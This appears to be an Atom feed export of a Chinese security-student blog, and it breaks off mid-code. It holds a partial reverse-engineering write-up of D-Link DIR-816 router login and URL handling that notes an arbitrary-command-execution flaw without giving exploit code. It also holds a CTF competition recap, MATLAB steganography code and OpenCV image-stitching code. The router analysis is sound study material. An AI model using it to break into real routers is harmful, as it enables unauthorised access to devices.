<span class="comment">/* tokenid 进行拼接 */</span></span><br><span class="line">  <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;local_158,<span class="string">"B05CC245BFB8A28A83B4F80000000000"</span>);</span><br><span class="line">  websDecode64(acStack296,username,<span class="number">0x80</span>);</span><br><span class="line">  <span class="keyword">if</span> (*password != <span class="number">0</span>) &#123;</span><br><span class="line">    decrypt_aes(&amp;local_158,password,acStack168);</span><br><span class="line">  &#125;</span><br><span class="line">  compareResult = <span class="built_in">strcmp</span>(__s1,acStack296);</span><br><span class="line">  <span class="keyword">if</span> (compareResult == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar2 = <span class="built_in">strcmp</span>(__s1_00,acStack168);</span><br><span class="line">    <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      logout = <span class="number">0</span>;</span><br><span class="line">                    <span class="comment">/* 如果密码正确记录login为1 */</span></span><br><span class="line">      login = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">strncpy</span>(load_host,(<span class="keyword">char</span> *)(iParm1 + <span class="number">0x30</span>),<span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> (g_LanWanConflict == <span class="number">1</span>) &#123;</span><br><span class="line">        websRedirect(iParm1,<span class="string">"d_wan_collision.asp"</span>);</span><br><span class="line">        g_LanWanConflict = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        websRedirect(iParm1,<span class="string">"index.asp"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">                    <span class="comment">/* 同时向这个文件写入0 */</span></span><br><span class="line">      system(<span class="string">"echo \"0\" &gt; /etc/RAMConfig/confirmlogin"</span>);</span><br><span class="line">      load_dictionary(uVar1,dictionary);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">"echo \"1\" &gt; /etc/RAMConfig/confirmlogin"</span>); <span class="comment">//登陆失败就写入1</span></span><br><span class="line">  websRedirect(iParm1,<span class="string">"dir_login.asp"</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure></p><blockquote><p>在更新BSS区的变量load_host后则会检测lan口和wan口的状态并返回对应的登录页面，随后将0写入/etc/RAMConfig/confirmlogin文件中</p></blockquote><p>通过上述的分析，实际上D-Link路由器在认证成功后仅仅记录了成功登录的用户IP地址，随后将是否需要验证登录的Flag文件内容设置为了0。</p><p>如下图所示，</p><p><img src="/2019/10/19/dir-816-zai-fen-xi/1571469459331.png" alt="1571469459331"></p><p>在更新BSS区的变量load_host后则会检测<code>lan</code>口和<code>wan</code>口的状态并返回对应的登录页面，随后将0写入/etc/RAMConfig/confirmlogin文件中。</p><p><img src="/2019/10/19/dir-816-zai-fen-xi/1571469514010.png" alt="1571469514010"></p><h3>相关的handler</h3><p>对于cgi程序是如何处理路由还不是很熟悉，不过感觉<code>handler</code>就是一个类似处理路由的函数</p><p><img src="/2019/10/19/dir-816-zai-fen-xi/1571470097156.png" alt="1571470097156"></p><p>根据不同的url路径<strong>goahead</strong>进程将使用不同的Handler进行处理。看到有两个全局Handler,<strong>websSecurityHandler</strong>和<strong>websDefaultHandler。</strong></p><p><img src="/2019/10/19/dir-816-zai-fen-xi/1571470161739.png" alt="1571470161739"></p><p><strong>websDefaultHandler</strong>会调用<strong>websValidateUrl</strong>函数对请求的url地址进行检测，主要的功能是对转义符号进行处理并避免'**../'**路径穿越的问题。</p><p>相关代码如下：</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">while</span> (__s_01 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      *__s_01 = <span class="string">'/'</span>;</span><br><span class="line">      __s_01 = <span class="built_in">strchr</span>(__s_01,<span class="number">0x5c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    __s_01 = strtok(__s_00,<span class="string">"/"</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s_01 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="number">0x3f</span> &lt; iVar4) <span class="keyword">goto</span> LAB_004088bc;</span><br><span class="line">          iVar2 = <span class="built_in">strcmp</span>(__s_01,<span class="string">".."</span>); <span class="comment">//查找到相关的字符，防止目录穿越</span></span><br><span class="line">          <span class="keyword">if</span> (iVar2 != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> (<span class="number">0</span> &lt; iVar4) &#123;</span><br><span class="line">            iVar4 = iVar4 + <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">LAB_004086e8:</span><br><span class="line">          __s_01 = strtok((<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="string">"/"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__s_01 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) <span class="keyword">goto</span> LAB_00408788;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar2 = <span class="built_in">strcmp</span>(__s_01,<span class="string">"."</span>);</span><br></pre></td></tr></table></figure></p><h3>form越权漏洞利用</h3><p>通过对main函数分析，可以找到相关的<code>form</code>函数</p><p><img src="/2019/10/19/dir-816-zai-fen-xi/1571470346745.png" alt="1571470346745"></p><p>重点关注<code>sub_458D7C</code>这个函数</p><p><img src="/2019/10/19/dir-816-zai-fen-xi/1571470605065.png" alt="1571470605065"></p><p>可以执行任意命令了</p><p>写的比较仓促，路由器的模拟也没有成功，还是需要用qemu单独调试</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;群晖的路由器好难分析，最后还是只能复现一下D-LINK的相关漏洞。&lt;/p&gt;
&lt;h2&gt;DIR-816历史漏洞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1706
      
    
    </summary>
    
      <category term="IOT" scheme="https://prontosil.club/categories/IOT/"/>
    
    
      <category term="IOT" scheme="https://prontosil.club/tags/IOT/"/>
    
      <category term="cgi" scheme="https://prontosil.club/tags/cgi/"/>
    
  </entry>
  
  <entry>
    <title>10月12日线下赛总结</title>
    <link href="https://prontosil.club/2019/10/14/10-yue-12-ri-xian-xia-sai-zong-jie/"/>
    <id>https://prontosil.club/2019/10/14/10-yue-12-ri-xian-xia-sai-zong-jie/</id>
    <published>2019-10-14T14:17:32.000Z</published>
    <updated>2019-10-14T14:27:13.246Z</updated>
    
    <content type="html"><![CDATA[<p>虽然很菜但是也忍不住想要总结一下</p><p>我们7点四十左右到底，八点半开始比赛，总共就两个小时，前半个小时用来加固自己的服务器。服务器3台，python一个，java一个，pwn一个。比赛开始的时候第一反应不都是登陆ssh嘛，结果一直连不上，然后工作人员告诉我们需要在网页登陆。。神tm网页登陆，那我怎么拷贝源码。。本来想用scp命令的结果发现这靶机连自己的机器都ping不通。。没办法只能通过网页的shell查看源码，折腾了好久才修改了密码，这时候半个小时早就过去了。于是开始了混战模式，这个时候ssh可以连上去了，但是pwn师傅的ssh一直连不上。那连不上还咋分析程序啊23333，没办法web狗开始审计源代码，python的站挺简单的，发现了一个SSTI漏洞，只过滤了几个关键字，把准备好的payload搞上去，试了好半天却没有得到flag？？？后来经过不懈的努力终于成功地读到了flag，然后就去交。。神tm还要验证码和对应靶机的ip地址。填完之后却提示flag错误了？？？难道这是别的队伍故意设下的陷进给的假的flag不成？？但是我又试了好多个还是失败了。。这就不知道为什么了。。</p><p>总之后期就是一直在交flag，，java的站连网站根目录都没有发现(原谅我tcl)，pwn师傅的ssh好不容易连上了却发现无法连上别的队伍的pwn服务器？？那还搞锤子。。结果后来pwn师傅也开始帮我交flag了，最后总算是靠着这个漏洞狗住了，从12名跳到了第四名。。</p><p>唉赛后pwn师傅一直吐槽这个服务器垃圾，赛后才知道原来是python的服务器的flag生成有问题导致。。唉不说了回家好好练习。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虽然很菜但是也忍不住想要总结一下&lt;/p&gt;
&lt;p&gt;我们7点四十左右到底，八点半开始比赛，总共就两个小时，前半个小时用来加固自己的服务器。服务器3台，python一个，java一个，pwn一个。比赛开始的时候第一反应不都是登陆ssh嘛，结果一直连不上，然后工作人员告诉我们需要在
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="杂的文" scheme="https://prontosil.club/tags/%E6%9D%82%E7%9A%84%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>二值图像的隐写</title>
    <link href="https://prontosil.club/2019/10/14/er-zhi-tu-xiang-de-yin-xie/"/>
    <id>https://prontosil.club/2019/10/14/er-zhi-tu-xiang-de-yin-xie/</id>
    <published>2019-10-14T11:40:49.000Z</published>
    <updated>2019-10-14T13:11:43.456Z</updated>
    
    <content type="html"><![CDATA[<h2>算法思想</h2><p>把一个二值图像分成矩形图像区域Bi,若某块p1bi &gt; 50% 则嵌入一个1，若p0bi &gt; 50% 则嵌入一个0</p><p>但是在嵌入的过程中需要对一些像素的颜色进行调整。</p><h2>准备1——计算可以利用的块</h2><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/msg0.png" alt=""></p><p>由上图可以看出，只有当一个块中0或者1的比例落在某个区间并且结合消息是0or1才可以决定这一块究竟是藏0还是藏1</p><p>为了简化我们将一幅图片分为10*10的大小，同时我们采用8*8检测，于是可以严格8*8检测的就只剩下中间的64个块了</p><p>我们假设有：</p><ol><li>msg 要隐藏的消息</li><li>count 消息的长度</li><li>image 二值图像</li><li>R1,R0,lumda 是我们设置的参数</li><li>computep1bi函数可以计算出某个块的p1bi</li><li>row,col是为了随机隐藏我们随机选择的块首地址</li></ol><p>我们需要确定的就是随机选出来的<code>row</code>和<code>col</code>是否可以用，于是很自然地想到需要对8*8的块进行遍历，同时标记<code>col</code>和<code>row</code>是否可用，不可用的直接将其设为-1</p><p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 最后计算哪些是可以用的存起来</span></span><br><span class="line"><span class="built_in">j</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:m*n</span><br><span class="line"><span class="keyword">if</span> row(<span class="built_in">i</span>) ~= <span class="number">-1</span></span><br><span class="line">  availabler(<span class="built_in">j</span>) = row(<span class="built_in">i</span>);</span><br><span class="line">  availablec(<span class="built_in">j</span>) = col(<span class="built_in">i</span>);</span><br><span class="line">  <span class="built_in">j</span> = <span class="built_in">j</span>+<span class="number">1</span>;</span><br></pre></td></tr></table></figure></p><p>完整代码</p><p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%分析可用的图像块与秘密信息对应</span></span><br><span class="line"><span class="comment">% msg count 为密码消息及其数量</span></span><br><span class="line"><span class="comment">% row col 存放的是随机选块后的块首地址的行列地址</span></span><br><span class="line"><span class="comment">% m*n 为总体数量</span></span><br><span class="line"><span class="comment">% image 为载体图像</span></span><br><span class="line"><span class="comment">% R1,R0,lumda 为参数</span></span><br><span class="line"><span class="comment">% randr randc 是在8*8范围内随机置乱的行列标</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[availabler, availablec, image]</span> = <span class="title">available</span><span class="params">(msg, count, row, col, m, n, image, R1, R0, lumda, randr, randc)</span></span></span><br><span class="line">msgquan = <span class="number">1</span>;</span><br><span class="line">unable = <span class="number">0</span>;</span><br><span class="line">difficult = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> blockquan = <span class="number">1</span>:m*n</span><br><span class="line">        <span class="comment">% 计算这一块的p1bi</span></span><br><span class="line">p1bi = compute1bi(row(blockquan), col(blockquan), image);  <span class="comment">%计算p1(bi)</span></span><br><span class="line"><span class="keyword">if</span> p1bi &gt;= R1+<span class="number">3</span>*lumda || p1bi &lt;= R0 <span class="number">-3</span>*lumda</span><br><span class="line">row(blockquan) = <span class="number">-1</span>; <span class="comment">% 标记为无用</span></span><br><span class="line">col(blockquan) = <span class="number">-1</span>;</span><br><span class="line">unable = unable + <span class="number">1</span>;</span><br><span class="line">msgquan = msgquan - <span class="number">1</span>; <span class="comment">% 该消息还未找到可以隐藏的块</span></span><br><span class="line"><span class="keyword">elseif</span> msg(msgquan, <span class="number">1</span>) == <span class="number">1</span> &amp;&amp; p1bi &lt;= R0</span><br><span class="line">            <span class="comment">% 调整p1bi变的更小</span></span><br><span class="line">image = editp1bi(row(blockquan), col(blockquan), image, <span class="number">1</span>, <span class="number">3</span>*lumda, randr, randc);</span><br><span class="line">row(blockquan) = <span class="number">-1</span>;</span><br><span class="line">col(blockquan) = <span class="number">-1</span>;</span><br><span class="line">difficult = difficult + <span class="number">1</span>;</span><br><span class="line">msgquan = msgquan - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">elseif</span> msg(msgquan, <span class="number">1</span>) == <span class="number">0</span> &amp;&amp; p1bi &gt;= R1</span><br><span class="line">image = editp1bi(row(blockquan),col(blockquan),image,<span class="number">0</span>,<span class="number">3</span>*lumda,randr,randc);</span><br><span class="line">row(blockquan) = <span class="number">-1</span>;</span><br><span class="line">col(blockquan) = <span class="number">-1</span>;</span><br><span class="line">difficult = difficult + <span class="number">1</span>;</span><br><span class="line">msgquan = msgquan - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">row(blockquan) = row(blockquan);</span><br><span class="line">col(blockquan) = col(blockquan);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">msgquan = msgquan + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> msgquan == count + <span class="number">1</span>;<span class="comment">%该消息已经读取完成</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = (blockquan + <span class="number">1</span>):m*n <span class="comment">%将其余的都设置为不可用</span></span><br><span class="line">row(<span class="built_in">i</span>) = <span class="number">-1</span>;</span><br><span class="line">col(<span class="built_in">i</span>) = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">disp</span>([<span class="string">'消息长度:'</span>, num2str(msgquan - <span class="number">1</span>), <span class="string">'bits;用到的块数:'</span>, num2str(blockquan),<span class="string">';其中不可用的块有:'</span>, num2str(unable),<span class="string">';另有'</span>,num2str(difficult),<span class="string">'块难以调整已修改为不可用块'</span>])</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">      <span class="comment">%载体分析完但消息还没有读完</span></span><br><span class="line">      <span class="keyword">if</span> msgquan &lt;= count</span><br><span class="line">        <span class="built_in">disp</span>([<span class="string">'消息长度:'</span>, num2str(msgquan - <span class="number">1</span>), <span class="string">'bits;用到的块数:'</span>, num2str(blockquan),<span class="string">';其中不可用的块有:'</span>, num2str(unable),<span class="string">';另有'</span>,num2str(difficult),<span class="string">'块难以调整已修改为不可用块'</span>])</span><br><span class="line">        <span class="built_in">disp</span>(<span class="string">'请根据以上数据更换载体'</span>);</span><br><span class="line">        error(<span class="string">'载体太小'</span>);</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      <span class="comment">%计算可用块的数量</span></span><br><span class="line">      <span class="comment">%disp(row)</span></span><br><span class="line">      quan = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:m*n</span><br><span class="line">        <span class="keyword">if</span> row(<span class="built_in">i</span>) ~= <span class="number">-1</span></span><br><span class="line">          quan = quan + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> quan &lt; count</span><br><span class="line">        error(<span class="string">'可用快太小'</span>);</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      <span class="built_in">disp</span>([<span class="string">'可用图像块为：'</span>, num2str(quan)]);</span><br><span class="line">      <span class="comment">%生成可用块的行标列标并于消息对应</span></span><br><span class="line">      image = <span class="built_in">round</span>(image);</span><br><span class="line">      availabler = <span class="built_in">zeros</span>([<span class="number">1</span>, quan]);</span><br><span class="line">      availablec = <span class="built_in">zeros</span>([<span class="number">1</span>, quan]);</span><br><span class="line">      <span class="built_in">j</span> = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:m*n</span><br><span class="line">        <span class="keyword">if</span> row(<span class="built_in">i</span>) ~= <span class="number">-1</span></span><br><span class="line">          availabler(<span class="built_in">j</span>) = row(<span class="built_in">i</span>);</span><br><span class="line">          availablec(<span class="built_in">j</span>) = col(<span class="built_in">i</span>);</span><br><span class="line">          <span class="built_in">j</span> = <span class="built_in">j</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2>准备2——修改像素点</h2><p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%修改像素的函数</span></span><br><span class="line"><span class="comment">% headr为块首行地址</span></span><br><span class="line"><span class="comment">% headc为块首列地址</span></span><br><span class="line"><span class="comment">% image 为图像</span></span><br><span class="line"><span class="comment">% pixel 为要修改的像素</span></span><br><span class="line"><span class="comment">% count 为修改的数量</span></span><br><span class="line"><span class="comment">% randr randc 是随机置乱的结果</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image</span> = <span class="title">editp1bi</span><span class="params">(headr, headc, image, pixel, count, randr, randc)</span></span></span><br><span class="line">  c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:<span class="number">64</span></span><br><span class="line">    <span class="keyword">if</span> image(headr+randr(<span class="built_in">i</span>), headc+randc(<span class="built_in">i</span>)) == pixel</span><br><span class="line">      <span class="comment">%八连接检测</span></span><br><span class="line">      <span class="keyword">if</span> image(headr+randr(<span class="built_in">i</span>)<span class="number">-1</span>, headc+randc(<span class="built_in">i</span>)) == ~pixel ||...</span><br><span class="line">        image(headr+randr(<span class="built_in">i</span>)+<span class="number">1</span>,headc+randc(<span class="built_in">i</span>)) == ~pixel ||...</span><br><span class="line">        image(headr+randr(<span class="built_in">i</span>),headc+randc(<span class="built_in">i</span>) - <span class="number">1</span>) ~= pixel || ...</span><br><span class="line">        image(headr+randr(<span class="built_in">i</span>),headc+randc(<span class="built_in">i</span>) + <span class="number">1</span>) ~= pixel || ...</span><br><span class="line">        image(headr+randr(<span class="built_in">i</span>)<span class="number">-1</span>,headc+randc(<span class="built_in">i</span>) - <span class="number">1</span>) ~= pixel|| ...</span><br><span class="line">        image(headr+randr(<span class="built_in">i</span>) <span class="number">-1</span>,headc+randc(<span class="built_in">i</span>) + <span class="number">1</span>) ~=pixel||...</span><br><span class="line">        image(headr+randr(<span class="built_in">i</span>)+ <span class="number">1</span>,headc+randc(<span class="built_in">i</span>) - <span class="number">1</span>) == ~pixel ||... </span><br><span class="line">        image(headr+randr(<span class="built_in">i</span>) + <span class="number">1</span>,headc+randc(<span class="built_in">i</span>) + <span class="number">1</span>) == ~pixel... </span><br><span class="line">        image(headr+randr(<span class="built_in">i</span>), headc+randc(<span class="built_in">i</span>)) = ~pixel+<span class="number">0.01</span>;</span><br><span class="line">        c = c+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      </span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">if</span> c==count</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> c ~= count</span><br><span class="line">  <span class="built_in">disp</span>(<span class="string">'warning! 参数选择不当 未能。。。建议重做'</span>);</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>这里其实就是针对中间的64个块进行8连接检测。关于8连接检测边界的做法，我的理解就是只要一个像素点周围的8个点有一个不一样就说明这个点是可以修改的，并且为了防止边界扩散，我们并不直接取反，而是取反后+0.01</p><h2>准备3——计算p1bi的函数</h2><p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p1bi</span> = <span class="title">compute1bi</span><span class="params">(headr,headc,image)</span></span></span><br><span class="line">   p1bi = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:<span class="number">10</span></span><br><span class="line">     <span class="keyword">for</span> <span class="built_in">j</span> = <span class="number">1</span>:<span class="number">10</span></span><br><span class="line">       <span class="keyword">if</span> image(headr+<span class="built_in">i</span><span class="number">-1</span>, headc+<span class="built_in">j</span><span class="number">-1</span>) == <span class="number">1</span></span><br><span class="line">         p1bi = p1bi + <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">end</span></span><br><span class="line">     <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;算法思想&lt;/h2&gt;
&lt;p&gt;把一个二值图像分成矩形图像区域Bi,若某块p1bi &amp;gt; 50% 则嵌入一个1，若p0bi &amp;gt; 50% 则嵌入一个0&lt;/p&gt;
&lt;p&gt;但是在嵌入的过程中需要对一些像素的颜色进行调整。&lt;/p&gt;
&lt;h2&gt;准备1——计算可以利用的块&lt;/h2&gt;

      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="matlab" scheme="https://prontosil.club/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>图片拼接作业</title>
    <link href="https://prontosil.club/2019/10/14/tu-pian-pin-jie-zuo-ye/"/>
    <id>https://prontosil.club/2019/10/14/tu-pian-pin-jie-zuo-ye/</id>
    <published>2019-10-14T11:13:26.000Z</published>
    <updated>2019-10-14T11:38:24.185Z</updated>
    
    <content type="html"><![CDATA[<h2>sift算子</h2><p>角点检测技术，比如<code>Harris</code>等，具有旋转不变性，即使图片发生了旋转，我们也能找到同样的角点。但是对图片进行缩放之后，角点就可能不再是角点了。</p><p>所以我们需要用尺度去描绘一副图片，不同大小的图片描绘的尺度，可以理解成单位是不一样的。为了达到这个目的需要使用尺度空间滤波器。SIFT算法使用高斯差分算子DOG来对LoG做一次近似。</p><p>图像金字塔，分成很多层，每一层又有很多组。之后我们可以做差值，经过一系列繁琐的步骤找到极值点。</p><p>按照教程写了一个代码调试一下：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">img = cv2.imread(<span class="string">'src1.jpg'</span>)</span><br><span class="line"><span class="comment"># 变成灰度图像</span></span><br><span class="line">gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line"></span><br><span class="line">sift = cv2.xfeatures2d.SIFT_create()</span><br><span class="line">kp = sift.detect(gray, <span class="keyword">None</span>)</span><br><span class="line">img = cv2.drawKeypoints(gray,kp,outImage=gray)</span><br><span class="line">cv2.imshow(<span class="string">'img'</span>,img)</span><br><span class="line">cv2.waitKey()</span><br></pre></td></tr></table></figure></p><p>效果图如下：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/imgkeypoint.png" alt=""></p><p>注意我使用的opencv版本，要使用sift算子必须是<code>sift = cv2.xfeatures2d.SIFT_create()</code></p><p>之后检测到特征点，直接调用<code>cv2.drawKeypoints</code>函数描绘特征点</p><p><code>cv2.drawKeypoints</code>主要的五个参数</p><ul><li><p>image:也就是原始图片</p></li><li><p>keypoints：从原图中获得的关键点，这也是画图时所用到的数据</p></li><li><p>outputimage：输出              //可以是原始图片</p></li><li><p>color：颜色设置，通过修改（b,g,r）的值,更改画笔的颜色，b=蓝色，g=绿色，r=红色。</p></li><li><p>flags：绘图功能的标识设置</p></li></ul><h2>特征点匹配如何做到图片拼接</h2><p>这个问题我也很疑惑之后再写</p><h2>图片拼接作业代码</h2><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"> </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"> 参考链接 https://blog.csdn.net/qq878594585/article/details/81901703</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">leftgray = cv2.imread(<span class="string">'src2.jpg'</span>)</span><br><span class="line">rightgray = cv2.imread(<span class="string">'src1.jpg'</span>)</span><br><span class="line"> </span><br><span class="line">hessian=<span class="number">400</span></span><br><span class="line">surf = cv2.xfeatures2d.SURF_create(hessian)</span><br><span class="line"><span class="comment">#surf=cv2.SURF(hessian) #将Hessian Threshold设置为400,阈值越大能检测的特征就越少</span></span><br><span class="line">kp1,des1=surf.detectAndCompute(leftgray,<span class="keyword">None</span>)  <span 